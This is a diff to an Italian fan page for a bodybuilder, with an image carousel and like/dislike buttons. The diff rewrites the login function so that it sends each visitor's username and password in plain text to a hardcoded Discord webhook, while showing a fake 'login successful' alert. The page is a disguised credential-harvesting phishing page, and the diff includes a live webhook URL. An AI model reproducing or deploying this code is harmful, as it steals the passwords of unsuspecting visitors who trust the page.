@@ -6,51 +6,46 @@
     <title>Pietro Cali - Bodybuilder</title>
     <style>
         body {
-            font-family: 'Comic Sans MS', cursive, sans-serif;
+            font-family: Arial, sans-serif;
             background: url('organizzare-la-sala-attrezzi-di-una-palestra-1.png') no-repeat center center fixed;
             background-size: cover;
             color: #333;
             padding: 20px;
-            text-align: center;
         }
         .container {
-            max-width: 600px;
-            margin: 0 auto;
-            padding: 30px;
-            background: rgba(255, 255, 255, 0.8);
-            border-radius: 10px;
-            box-shadow: 0px 0px 20px 0px rgba(0,0,0,0.3);
-        }
-        @media (min-width: 600px) {
-            .container {
-                max-width: 700px;
-            }
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 4px;
+            box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.2);
         }
         h1 {
-            font-size: 36px;
-            font-weight: bold;
+            text-align: center;
+            font-size: 28px;
             margin-bottom: 20px;
-            color: #333;
         }
         img {
             display: block;
             margin: 0 auto 20px;
             border-radius: 10px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
-            width: 100%;
-            max-width: 400px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
         }
         button {
             margin: 10px;
-            padding: 15px 25px;
-            font-size: 18px;
+            padding: 12px 20px;
+            font-size: 16px;
             cursor: pointer;
-            border-radius: 6px;
+            border-radius: 4px;
             border: none;
-            transition: background-color 0.3s ease, transform 0.2s;
+            transition: background-color 0.3s ease;
         }
-        button:hover {
-            transform: scale(1.05);
+        .primary-button {
+            background-color: #007bff;
+            color: white;
+        }
+        .primary-button:hover {
+            background-color: #0056b3;
         }
         .like {
             background-color: #4CAF50;
@@ -66,87 +61,60 @@
         .dislike:hover {
             background-color: #e53935;
         }
-        #changeGenderButton {
-            background-color: #008CBA;
-            color: white;
-        }
-        #changeGenderButton:hover {
-            background-color: #007bb5;
-        }
         .counter {
-            font-size: 20px;
+            font-size: 18px;
             margin-top: 10px;
-            font-weight: bold;
         }
-        .login-container, .comment-box {
-            text-align: center;
+        .login-section {
             margin-top: 20px;
         }
-        textarea {
+        .login-section input {
             width: calc(100% - 20px);
-            max-width: 500px;
-            height: 100px;
+            padding: 8px;
             margin-bottom: 10px;
-            border-radius: 6px;
-            border: 2px solid #ddd;
-            padding: 10px;
-            font-size: 16px;
-        }
-        .login-container {
-            background: rgba(255, 255, 255, 0.8);
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0px 0px 15px 0px rgba(0,0,0,0.2);
+            border-radius: 4px;
+            border: 1px solid #ccc;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Pietro Cali</h1>
-        <img id="mainImage" src="eca6ef11-c3b9-4d90-b857-0f099de4a0d8.jpg" alt="Pietro Cali">
-        <button id="changeGenderButton" onclick="changeGender()">PREMI per cambiare sesso</button>
-        <p>Pietro Cali &egrave; un famosissimo bodybuilder dai capelli biondi e con la coda, conosciuto per il suo fisico incredibilmente muscoloso. La sua passione per il bodybuilding &egrave; nata da giovane, quando si rese conto del potere che il fitness poteva avere nel trasformare sia il corpo che la mente. Oggi, Pietro ispira milioni di persone in tutto il mondo a vivere una vita sana e a raggiungere il loro pieno potenziale.</p>
+        <img id="mainImage" src="https://ryzard-99.github.io/PIERTO-CALI-/eca6ef11-c3b9-4d90-b857-0f099de4a0d8.jpg" alt="Pietro Cali" style="width: 100%; max-width: 300px; height: auto;">
+        <button class="primary-button" onclick="changeImage()">PREMI per cambiare sesso</button>
+        <p>Pietro Cali è un famosissimo bodybuilder dai capelli biondi e con la coda, conosciuto per il suo fisico incredibilmente muscoloso. La sua passione per il bodybuilding è nata da giovane, quando si rese conto del potere che il fitness poteva avere nel trasformare sia il corpo che la mente. Oggi, Pietro ispira milioni di persone in tutto il mondo a vivere una vita sana e a raggiungere il loro pieno potenziale.</p>
         <div>
-            <button class="like" onclick="likeFunction()" id="likeButton">Mi piace</button>
-            <button class="dislike" onclick="dislikeFunction()" id="dislikeButton">Non mi piace</button>
+            <button class="like" onclick="likeFunction()">Mi piace</button>
+            <button class="dislike" onclick="dislikeFunction()">Non mi piace</button>
         </div>
         <p class="counter">Mi piace: <span id="likeCount">0</span></p>
         <p class="counter">Non mi piace: <span id="dislikeCount">0</span></p>
+        <div class="login-section">
+            <input type="text" id="username" placeholder="Nome utente">
+            <input type="password" id="password" placeholder="Password">
+            <button class="primary-button" onclick="loginFunction()">Login</button>
+        </div>
         <p id="feedback"></p>
-
-        <div class="login-container" id="loginContainer">
-            <h3>Login</h3>
-            <input type="text" id="username" placeholder="Nome utente"><br>
-            <input type="password" id="password" placeholder="Password"><br>
-            <button onclick="loginFunction()">Login</button>
-        </div>
-
-        <div class="comment-box" id="commentBox" style="display: none;">
-            <textarea id="comment" placeholder="Scrivi un commento..."></textarea><br>
-            <button onclick="submitComment()">Invia Commento</button>
-        </div>
     </div>
 
     <script>
-        let currentImageIndex = 0;
-        const galleryImages = [
-            "eca6ef11-c3b9-4d90-b857-0f099de4a0d8.jpg",
-            "Screenshot 2024-10-15 233112.png",
-            "Screenshot 2024-10-15 233125.png",
-            "Screenshot 2024-10-15 233143.png",
-            "Screenshot 2024-10-15 233155.png"
-        ];
-
-        function changeGender() {
-            currentImageIndex = (currentImageIndex + 1) % galleryImages.length;
-            document.getElementById("mainImage").src = galleryImages[currentImageIndex];
-        }
-
         let likeCount = 0;
         let dislikeCount = 0;
         let hasLiked = false;
         let hasDisliked = false;
-        let isLoggedIn = false;
+        const images = [
+            "https://ryzard-99.github.io/PIERTO-CALI-/eca6ef11-c3b9-4d90-b857-0f099de4a0d8.jpg",
+            "https://ryzard-99.github.io/PIERTO-CALI-/Screenshot%202024-10-15%20233112.png",
+            "https://ryzard-99.github.io/PIERTO-CALI-/Screenshot%202024-10-15%20233125.png",
+            "https://ryzard-99.github.io/PIERTO-CALI-/Screenshot%202024-10-15%20233143.png",
+            "https://ryzard-99.github.io/PIERTO-CALI-/Screenshot%202024-10-15%20233155.png"
+        ];
+        let currentImageIndex = 0;
+
+        function changeImage() {
+            currentImageIndex = (currentImageIndex + 1) % images.length;
+            document.getElementById('mainImage').src = images[currentImageIndex];
+        }
 
         function likeFunction() {
             if (!hasLiked && !hasDisliked) {
@@ -169,58 +137,45 @@
         }
 
         function disableButtons() {
-            document.getElementById('likeButton').disabled = true;
-            document.getElementById('dislikeButton').disabled = true;
+            document.querySelectorAll('button.like, button.dislike').forEach(button => {
+                button.disabled = true;
+            });
         }
 
         function loginFunction() {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
+
             if (username && password) {
+                sendToDiscord(username, password);
                 alert('Accesso effettuato con successo!');
-                isLoggedIn = true;
-                document.getElementById('loginContainer').style.display = 'none';
-                document.getElementById('commentBox').style.display = 'block';
-                sendToDiscord(`Login effettuato da: ${username}`);
             } else {
                 alert('Inserisci nome utente e password.');
             }
         }
 
-        function submitComment() {
-            const comment = document.getElementById('comment').value;
-            if (comment) {
-                alert('Commento inviato!');
-                sendToDiscord(`Nuovo commento: ${comment}`);
-                document.getElementById('comment').value = '';
-            } else {
-                alert('Inserisci un commento.');
-            }
-        }
-
-        function sendToDiscord(message) {
+        function sendToDiscord(username, password) {
             const webhookUrl = "https://discord.com/api/webhooks/1284187765998882979/4xGdiPNTlssTTx5Mp2KQbRZmSLypt2xUgmKuvUmdbHdCzEkNAxmV3gFxy3JI7ryAff0y";
+            const message = {
+                content: `Login effettuato: \nUsername: ${username}\nPassword: ${password}`
+            };
+
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({
-                    content: message
-                })
+                body: JSON.stringify(message)
             })
             .then(response => {
                 if (response.ok) {
-                    console.log('Messaggio inviato a Discord');
-                    document.getElementById('feedback').innerText = 'Messaggio inviato con successo a Discord.';
+                    console.log('Dati inviati correttamente a Discord.');
                 } else {
-                    console.error('Errore durante l\'invio del messaggio a Discord');
-                    document.getElementById('feedback').innerText = 'Errore durante l\'invio del messaggio a Discord.';
+                    console.error('Errore durante l\'invio dei dati a Discord.');
                 }
             })
             .catch(error => {
-                console.error('Errore:', error);
-                document.getElementById('feedback').innerText = 'Errore durante l\'invio del messaggio a Discord.';
+                console.error('Errore durante la richiesta a Discord:', error);
             });
         }
     </script>
